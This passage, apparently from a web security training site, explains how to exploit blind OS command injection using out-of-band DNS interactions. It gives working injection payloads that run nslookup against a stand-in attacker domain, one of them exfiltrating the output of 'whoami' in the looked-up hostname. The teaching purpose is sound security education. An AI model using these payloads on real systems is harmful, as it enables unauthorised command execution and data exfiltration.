### Exploiting blind OS command injection using out-of-band (**[OAST](https://portswigger.net/burp/application-security-testing/oast)**) techniques
  
  
You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques.  
  
For example:  
>`& nslookup kgji2ohoyw.web-attacker.com &`  
  
This payload uses the `nslookup` command to cause a DNS lookup for the specified domain.  
  
The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.

The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:  
>``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``  
  
This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command:  
>`wwwuser.kgji2ohoyw.web-attacker.com`
